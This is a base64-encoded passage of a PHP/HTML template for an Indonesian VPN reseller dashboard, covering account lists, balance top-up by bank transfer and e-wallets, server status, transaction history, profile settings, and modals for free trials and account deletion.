jbGFzcz0iYWt1bi1iYWRnZSBiYWRnZS08Pz0kYVsndGlwZSddPz4iPjw/PXN0cnRvdXBwZXIoJGFbJ3RpcGUnXSk/Pjw/PSRhWydpc190cmlhbCddPycg8J+OgSc6Jyc/Pjwvc3Bhbj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1pbmZvIj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLW5hbWUiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ3VzZXJuYW1lJ10pPz48L2Rpdj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLW1ldGEiPjw/PSRhWydmbGFnJ10/Pyfwn4eu8J+HqSc/PiA8Pz1odG1sc3BlY2lhbGNoYXJzKCRhWyduYW1hX3NlcnZlciddKT8+IMK3IDw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ3N0YXR1cyddKT8+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2FsaWduLWl0ZW1zOmZsZXgtZW5kO2dhcDouM3JlbSI+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1leHAgPD89JGV4cENsYXNzPz4iPjw/PSRhWydpc190cmlhbCddPyfij7EgVHJpYWwnOigkYVsnc3RhdHVzJ109PT0nYWN0aXZlJz8n4o+zICcuJHNpc2EuJyBoYXJpJzon4p2MIEV4cGlyZWQnKT8+PC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouMzVyZW0iPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZSIgb25jbGljaz0ic2hvd0FrdW5EZXRhaWwoPD89anNvbl9lbmNvZGUoJGEpPz4pIj7wn5GBPC9idXR0b24+CiAgICAgICAgICAgICAgICA8P3BocCBpZigkYVsnc3RhdHVzJ109PT0nYWN0aXZlJyk6Pz4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tc20gYnRuLXJlZCIgb25jbGljaz0iY29uZmlybURlbGV0ZSg8Pz0kYVsnaWQnXT8+LCAnPD89aHRtbHNwZWNpYWxjaGFycygkYVsndXNlcm5hbWUnXSk/PicsJzw/PSRhWyd0aXBlJ10/PicpIj7wn5eRPC9idXR0b24+CiAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjs/PgogICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDsgZW5kaWY7Pz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8IS0tIFBBR0U6IFRPUFVQIC0tPgogICAgPGRpdiBpZD0icGFnZS10b3B1cCIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7wn5KwIElzaSBTYWxkbzwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+Tm9taW5hbCBUb3B1cDwvbGFiZWw+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJudW1iZXIiIGlkPSJ0b3B1cEFtb3VudCIgcGxhY2Vob2xkZXI9Ik1pbi4gUnAgNS4wMDAiIG1pbj0iNTAwMCIgc3RlcD0iMTAwMCI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+TWV0b2RlIFBlbWJheWFyYW48L2xhYmVsPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0b3B1cC1tZXRob2RzIiBpZD0idG9wdXBNZXRob2RzIj4KICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJtZXRob2QtYnRuIGFjdGl2ZSIgZGF0YS1tZXRob2Q9Im1hbnVhbF90cmFuc2ZlciIgb25jbGljaz0ic2VsZWN0TWV0aG9kKHRoaXMpIj48c3BhbiBjbGFzcz0ibS1pY29uIj7wn4+mPC9zcGFuPjxzcGFuIGNsYXNzPSJtLW5hbWUiPlRyYW5zZmVyIEJhbms8L3NwYW4+PC9idXR0b24+CiAgICAgICAgICAgICAgPD9waHAgaWYoZ2V0U2V0dGluZygncXJpc19pbWFnZScpKTo/PjxidXR0b24gY2xhc3M9Im1ldGhvZC1idG4iIGRhdGEtbWV0aG9kPSJxcmlzIiBvbmNsaWNrPSJzZWxlY3RNZXRob2QodGhpcykiPjxzcGFuIGNsYXNzPSJtLWljb24iPvCfk7E8L3NwYW4+PHNwYW4gY2xhc3M9Im0tbmFtZSI+UVJJUzwvc3Bhbj48L2J1dHRvbj48P3BocCBlbmRpZjs/PgogICAgICAgICAgICAgIDw/cGhwIGlmKGdldFNldHRpbmcoJ2RhbmFfbnVtYmVyJykpOj8+PGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biIgZGF0YS1tZXRob2Q9ImRhbmEiIG9uY2xpY2s9InNlbGVjdE1ldGhvZCh0aGlzKSI+PHNwYW4gY2xhc3M9Im0taWNvbiI+8J+SmTwvc3Bhbj48c3BhbiBjbGFzcz0ibS1uYW1lIj5EYW5hPC9zcGFuPjwvYnV0dG9uPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICAgICAgPD9waHAgaWYoZ2V0U2V0dGluZygnZ29wYXlfbnVtYmVyJykpOj8+PGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biIgZGF0YS1tZXRob2Q9ImdvcGF5IiBvbmNsaWNrPSJzZWxlY3RNZXRob2QodGhpcykiPjxzcGFuIGNsYXNzPSJtLWljb24iPvCfkpo8L3NwYW4+PHNwYW4gY2xhc3M9Im0tbmFtZSI+R29QYXk8L3NwYW4+PC9idXR0b24+PD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgICA8P3BocCBpZihnZXRTZXR0aW5nKCdzaG9wZWVfbnVtYmVyJykpOj8+PGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biIgZGF0YS1tZXRob2Q9InNob3BlcGF5IiBvbmNsaWNrPSJzZWxlY3RNZXRob2QodGhpcykiPjxzcGFuIGNsYXNzPSJtLWljb24iPvCfp6E8L3NwYW4+PHNwYW4gY2xhc3M9Im0tbmFtZSI+U2hvcGVlUGF5PC9zcGFuPjwvYnV0dG9uPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8ZGl2IGlkPSJwYXltZW50SW5mbyIgc3R5bGU9ImJhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6MXJlbTttYXJnaW46Ljc1cmVtIDAiPgogICAgICAgICAgICA8ZGl2IGlkPSJiYW5rSW5mbyI+CiAgICAgICAgICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTouOHJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luLWJvdHRvbTouNXJlbSI+VHJhbnNmZXIga2UgcmVrZW5pbmcgYmVyaWt1dDo8L3A+CiAgICAgICAgICAgICAgPHAgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCI+PD89Z2V0U2V0dGluZygnYmFua19uYW1lJyk/PiDigJQgPD89Z2V0U2V0dGluZygnYmFua19hY2NvdW50Jyk/PjwvcD4KICAgICAgICAgICAgICA8cCBzdHlsZT0iY29sb3I6dmFyKC0tbXV0ZWQpO2ZvbnQtc2l6ZTouODc1cmVtIj5hL24gPD89Z2V0U2V0dGluZygnYmFua19ob2xkZXInKT8+PC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0iZGFuYUluZm8iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPjxwIHN0eWxlPSJmb250LXdlaWdodDo3MDAiPkRhbmE6IDw/PWdldFNldHRpbmcoJ2RhbmFfbnVtYmVyJyk/PjwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0iZ29wYXlJbmZvIiBzdHlsZT0iZGlzcGxheTpub25lIj48cCBzdHlsZT0iZm9udC13ZWlnaHQ6NzAwIj5Hb1BheTogPD89Z2V0U2V0dGluZygnZ29wYXlfbnVtYmVyJyk/PjwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0ic2hvcGVlSW5mbyIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+PHAgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCI+U2hvcGVlUGF5OiA8Pz1nZXRTZXR0aW5nKCdzaG9wZWVfbnVtYmVyJyk/PjwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0icXJpc0luZm8iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICAgICAgICAgIDw/cGhwIGlmKGdldFNldHRpbmcoJ3FyaXNfaW1hZ2UnKSk6Pz48aW1nIHNyYz0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdxcmlzX2ltYWdlJykpPz4iIHN0eWxlPSJtYXgtd2lkdGg6MjAwcHg7Ym9yZGVyLXJhZGl1czo4cHg7bWFyZ2luLXRvcDouNXJlbSI+PD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5VcGxvYWQgQnVrdGkgVHJhbnNmZXIgKG9wc2lvbmFsKTwvbGFiZWw+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBpZD0iYnVrdGlGaWxlIiBhY2NlcHQ9ImltYWdlLyoiPjwvZGl2PgogICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBzdHlsZT0id2lkdGg6MTAwJSIgb25jbGljaz0iZG9Ub3B1cCgpIj7wn5OkIEtpcmltIFBlcm1pbnRhYW4gVG9wdXA8L2J1dHRvbj4KICAgICAgICAgIDxkaXYgaWQ9InRvcHVwUmVzdWx0IiBzdHlsZT0ibWFyZ2luLXRvcDoxcmVtIj48L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8IS0tIFBBR0U6IFNFUlZFUiAtLT4KICAgIDxkaXYgaWQ9InBhZ2Utc2VydmVyIiBzdHlsZT0iZGlzcGxheTpub25lIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPvCfjJAgU3RhdHVzIFNlcnZlcjwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8P3BocCBmb3JlYWNoKCRzZXJ2ZXJzIGFzICRzKTogJHN0PSRzWydzdGF0dXMnXTs/PgogICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1pdGVtIj4KICAgICAgICAgICAgPGRpdj48Pz0kc1snZmxhZyddPz8n8J+HrvCfh6knPz48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1pbmZvIj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLW5hbWUiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ25hbWFfc2VydmVyJ10pPz48L2Rpdj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLW1ldGEiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ2xva2FzaSddKT8+IMK3IDw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ2NvZGVfc2VydmVyJ10pPz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgc3R5bGU9InRleHQtYWxpZ246cmlnaHQiPgogICAgICAgICAgICAgIDxzcGFuPjxzcGFuIGNsYXNzPSJzZXJ2ZXItc3RhdHVzIHMtPD89JHN0Pz4iPjwvc3Bhbj48Pz0kc3Q9PT0ncmVhZHknPydPbmxpbmUnOigkc3Q9PT0nbWFpbnRlbmFuY2UnPydNYWludGVuYW5jZSc6J09mZmxpbmUnKT8+PC9zcGFuPgogICAgICAgICAgICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbi10b3A6LjJyZW0iPjw/PWZvcm1hdFJ1cGlhaCgkc1snaGFyZ2FfaGFyaSddKT8+L2hhcmkgwrcgPD89Zm9ybWF0UnVwaWFoKCRzWydoYXJnYV9idWxhbiddKT8+L2J1bGFuPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOz8+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICA8P3BocCAkd2E9Z2V0U2V0dGluZygnY29udGFjdF93YScpOyAkdGc9Z2V0U2V0dGluZygnY29udGFjdF90ZycpOyAkaWc9Z2V0U2V0dGluZygnY29udGFjdF9pZycpOwogICAgICBpZigkd2F8fCR0Z3x8JGlnKTo/PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+8J+TniBIdWJ1bmdpIEFkbWluPC9kaXY+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IiBzdHlsZT0iZGlzcGxheTpmbGV4O2ZsZXgtd3JhcDp3cmFwO2dhcDouNzVyZW0iPgogICAgICAgICAgPD9waHAgaWYoJHdhKTo/PjxhIGhyZWY9Imh0dHBzOi8vd2EubWUvPD89cHJlZ19yZXBsYWNlKCcvXEQvJywnJywkd2EpPz4iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIGJ0bi1ncmVlbiI+8J+SrCBXaGF0c0FwcDwvYT48P3BocCBlbmRpZjs/PgogICAgICAgICAgPD9waHAgaWYoJHRnKTo/PjxhIGhyZWY9Imh0dHBzOi8vdC5tZS88Pz1sdHJpbSgkdGcsJ0AnKT8+IiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+4pyI77iPIFRlbGVncmFtPC9hPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICA8P3BocCBpZigkaWcpOj8+PGEgaHJlZj0iaHR0cHM6Ly9pbnN0YWdyYW0uY29tLzw/PWx0cmltKCRpZywnQCcpPz4iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCNlMTMwNmMsIzgzM2FiNCk7Y29sb3I6I2ZmZiI+8J+TuCBJbnN0YWdyYW08L2E+PD9waHAgZW5kaWY7Pz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIDw/cGhwIGVuZGlmOz8+CiAgICA8L2Rpdj4KCiAgICA8IS0tIFBBR0U6IFJJV0FZQVQgLS0+CiAgICA8ZGl2IGlkPSJwYWdlLXJpd2F5YXQiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+8J+TiiBSaXdheWF0IFRyYW5zYWtzaTwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8P3BocCAkYWxsVHJ4PSRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB0cmFuc2FjdGlvbnMgV0hFUkUgdXNlcl9pZD0/IE9SREVSIEJZIGNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1MCIpOwogICAgICAgICAgJGFsbFRyeC0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkYWxsVHJ4PSRhbGxUcngtPmZldGNoQWxsKCk7CiAgICAgICAgICBpZihlbXB0eSgkYWxsVHJ4KSk6Pz48ZGl2IGNsYXNzPSJlbXB0eS1zdGF0ZSI+PGRpdiBjbGFzcz0iaWNvbiI+8J+TijwvZGl2PjxwPkJlbHVtIGFkYSB0cmFuc2Frc2k8L3A+PC9kaXY+CiAgICAgICAgICA8P3BocCBlbHNlOiBmb3JlYWNoKCRhbGxUcnggYXMgJHQpOj8+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaXRlbSB0cngtPD89JHRbJ3R5cGUnXT8+Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idHJ4LWljb24iPjw/PSR0Wyd0eXBlJ109PT0ndG9wdXAnPyfirIbvuI8nOigkdFsndHlwZSddPT09J3JlZnVuZCc/J+KGqe+4jyc6J+Ksh++4jycpPz48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idHJ4LWluZm8iPjxkaXYgY2xhc3M9InRyeC1kZXNjIj48Pz1odG1sc3BlY2lhbGNoYXJzKCR0WydrZXRlcmFuZ2FuJ10/P3VjZmlyc3QoJHRbJ3R5cGUnXSkpPz48L2Rpdj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtZGF0ZSI+PD89ZGF0ZSgnZCBNIFksIEg6aScsc3RydG90aW1lKCR0WydjcmVhdGVkX2F0J10pKT8+IMK3IDw/PSR0WydzdGF0dXMnXT8+PC9kaXY+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1hbW91bnQiIHN0eWxlPSJjb2xvcjo8Pz0kdFsndHlwZSddPT09J3RvcHVwJ3x8JHRbJ3R5cGUnXT09PSdyZWZ1bmQnPyd2YXIoLS1ncmVlbiknOid2YXIoLS1yZWQpJz8+Ij48Pz0kdFsndHlwZSddPT09J3RvcHVwJ3x8JHRbJ3R5cGUnXT09PSdyZWZ1bmQnPycrJzonLSc/Pjw/PWZvcm1hdFJ1cGlhaCgkdFsnYW1vdW50J10pPz48L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDsgZW5kaWY7Pz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8IS0tIFBBR0U6IFNFVFRJTkcgLS0+CiAgICA8ZGl2IGlkPSJwYWdlLXNldHRpbmciIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+4pqZ77iPIFNldHRpbmcgQWt1bjwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8ZGl2IGlkPSJzZXR0aW5nQWxlcnQiPjwvZGl2PgogICAgICAgICAgPGZvcm0gaWQ9InByb2ZpbGVGb3JtIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPlVzZXJuYW1lPC9sYWJlbD4KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHVzZXJbJ3VzZXJuYW1lJ10pPz4iIGRpc2FibGVkIHN0eWxlPSJvcGFjaXR5Oi41Ij48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPkVtYWlsPC9sYWJlbD4KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZW1haWwiIGlkPSJzZXR0aW5nRW1haWwiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKCR1c2VyWydlbWFpbCddKT8+Ij48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPldoYXRzQXBwIChvcHNpb25hbCk8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0ic2V0dGluZ1dhIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycygkdXNlclsnd2hhdHNhcHAnXT8/JycpPz4iIHBsYWNlaG9sZGVyPSIwOHh4eHh4eHh4eHgiPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+UGFzc3dvcmQgQmFydSAoa29zb25na2FuIGppa2EgdGlkYWsgZGlnYW50aSk8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InNldHRpbmdQYXNzIiBwbGFjZWhvbGRlcj0i4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPktvbmZpcm1hc2kgUGFzc3dvcmQgQmFydTwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0ic2V0dGluZ1Bhc3NDb25maXJtIiBwbGFjZWhvbGRlcj0i4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIj48L2Rpdj4KICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiIG9uY2xpY2s9InNhdmVQcm9maWxlKCkiPvCfkr4gU2ltcGFuIFBlcnViYWhhbjwvYnV0dG9uPgogICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICA8L2Rpdj48IS0tIC5jb250ZW50IC0tPgo8L2Rpdj48IS0tIC5tYWluIC0tPgoKPCEtLSBNT0RBTDogQWt1biBEZXRhaWwgLS0+CjxkaXYgY2xhc3M9Im1vZGFsIiBpZD0ibW9kYWxBa3VuIj4KICA8ZGl2IGNsYXNzPSJtb2RhbC1iYWNrZHJvcCIgb25jbGljaz0iY2xvc2VNb2RhbCgnbW9kYWxBa3VuJykiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1vZGFsLWJveCI+CiAgICA8YnV0dG9uIGNsYXNzPSJtb2RhbC1jbG9zZSIgb25jbGljaz0iY2xvc2VNb2RhbCgnbW9kYWxBa3VuJykiPuKclTwvYnV0dG9uPgogICAgPGRpdiBjbGFzcz0ibW9kYWwtdGl0bGUiPvCfk7YgRGV0YWlsIEFrdW4gVlBOPC9kaXY+CiAgICA8ZGl2IGlkPSJha3VuRGV0YWlsQ29udGVudCI+PC9kaXY+CiAgPC9kaXY+CjwvZGl2PgoKPCEtLSBNT0RBTDogVHJpYWwgLS0+CjxkaXYgY2xhc3M9Im1vZGFsIiBpZD0ibW9kYWxUcmlhbCI+CiAgPGRpdiBjbGFzcz0ibW9kYWwtYmFja2Ryb3AiIG9uY2xpY2s9ImNsb3NlTW9kYWwoJ21vZGFsVHJpYWwnKSI+PC9kaXY+CiAgPGRpdiBjbGFzcz0ibW9kYWwtYm94Ij4KICAgIDxidXR0b24gY2xhc3M9Im1vZGFsLWNsb3NlIiBvbmNsaWNrPSJjbG9zZU1vZGFsKCdtb2RhbFRyaWFsJykiPuKclTwvYnV0dG9uPgogICAgPGRpdiBjbGFzcz0ibW9kYWwtdGl0bGUiPuKaoSBUcmlhbCBWUE4gR3JhdGlzPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1pbmZvIiBzdHlsZT0iZm9udC1zaXplOi44MnJlbSI+VHJpYWwgMSBqYW0gZ3JhdGlzLCAxeCBwZXIgaGFyaSwgcXVvdGEgMUdCLjwvZGl2PgogICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPlNlcnZlcjwvbGFiZWw+CiAgICAgIDxzZWxlY3QgaWQ9InRyaWFsU2VydmVyIj4KICAgICAgICA8P3BocCBmb3JlYWNoKCRzZXJ2ZXJzIGFzICRzKTo/PjxvcHRpb24gdmFsdWU9Ijw/PSRzWydpZCddPz4iPjw/PSRzWydmbGFnJ10/Pyfwn4eu8J+HqSc/PiA8Pz1odG1sc3BlY2lhbGNoYXJzKCRzWyduYW1hX3NlcnZlciddKT8+PC9vcHRpb24+PD9waHAgZW5kZm9yZWFjaDs/PgogICAgICA8L3NlbGVjdD48L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5Qcm90b2tvbDwvbGFiZWw+CiAgICAgIDxkaXYgY2xhc3M9InByb3RvLWdyaWQiPgogICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biBhY3RpdmUiIGRhdGEtcHJvdG89InZtZXNzIiBvbmNsaWNrPSJzZWxlY3RUcmlhbFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+4pqhPC9zcGFuPlZNZXNzPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLXByb3RvPSJ2bGVzcyIgb25jbGljaz0ic2VsZWN0VHJpYWxQcm90byh0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPvCfmoA8L3NwYW4+Vkxlc3M8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJwcm90by1idG4iIGRhdGEtcHJvdG89InRyb2phbiIgb25jbGljaz0ic2VsZWN0VHJpYWxQcm90byh0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPvCfm6HvuI88L3NwYW4+VHJvamFuPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLXByb3RvPSJzc2giIG9uY2xpY2s9InNlbGVjdFRyaWFsUHJvdG8odGhpcykiPjxzcGFuIGNsYXNzPSJpY29uIj7wn5SSPC9zcGFuPlNTSDwvYnV0dG9uPgogICAgICA8L2Rpdj48L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5Vc2VybmFtZTwvbGFiZWw+CiAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idHJpYWxVc2VybmFtZSIgcGxhY2Vob2xkZXI9IkJ1YXQgdXNlcm5hbWUgdHJpYWwiPjwvZGl2PgogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBzdHlsZT0id2lkdGg6MTAwJTttYXJnaW4tdG9wOi41cmVtIiBvbmNsaWNrPSJkb1RyaWFsKCkiPuKaoSBBbWJpbCBUcmlhbCBHcmF0aXM8L2J1dHRvbj4KICAgIDxkaXYgaWQ9InRyaWFsUmVzdWx0IiBjbGFzcz0icmVzdWx0LWJveCI+PC9kaXY+CiAgPC9kaXY+CjwvZGl2PgoKPCEtLSBNT0RBTDogS29uZmlybWFzaSBEZWxldGUgLS0+CjxkaXYgY2xhc3M9Im1vZGFsIiBpZD0ibW9kYWxEZWxldGUiPgogIDxkaXYgY2xhc3M9Im1vZGFsLWJhY2tkcm9wIiBvbmNsaWNrPSJjbG9zZU1vZGFsKCdtb2RhbERlbGV0ZScpIj48L2Rpdj4KICA8ZGl2IGNsYXNzPSJtb2RhbC1ib3giIHN0eWxlPSJtYXgtd2lkdGg6MzgwcHgiPgogICAgPGRpdiBjbGFzcz0ibW9kYWwtdGl0bGUiPvCfl5HvuI8gSGFwdXMgQWt1bjwvZGl2PgogICAgPHAgc3R5bGU9ImNvbG9yOnZhcigtLW11dGVkKTtmb250LXNpemU6Ljg3NXJlbTttYXJnaW4tYm90dG9tOjEuMjVyZW0iPllha2luIGluZ2luIG1lbmdoYXB1cyBha3VuIDxzdHJvbmcgaWQ9ImRlbGV0ZVVzZXJuYW1lIj48L3N0cm9uZz4/IEFrdW4gYWthbiBkaWhhcHVzIGRhcmkgc2VydmVyLjwvcD4KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6Ljc1cmVtIj4KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lIiBzdHlsZT0iZmxleDoxIiBvbmNsaWNrPSJjbG9zZU1vZGFsKCdtb2RhbERlbGV0ZScpIj5CYXRhbDwvYnV0dG9uPgogICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXJlZCIgc3R5bGU9ImZsZXg6MSIgb25jbGljaz0iZG9EZWxldGUoKSIgaWQ9ImRlbGV0ZUJ0biI+8J+XkSBIYXB1czwvYnV0dG9uPgogICAgPC9k